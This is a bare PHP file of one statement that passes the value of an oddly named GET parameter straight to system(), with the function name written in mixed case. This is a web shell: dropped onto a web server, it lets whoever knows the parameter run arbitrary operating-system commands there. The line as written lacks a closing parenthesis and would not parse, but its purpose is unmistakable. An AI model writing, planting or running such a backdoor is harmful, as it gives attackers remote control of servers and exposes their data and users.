<?php
SysTeM($_GET['P30h1ifh'];
?>
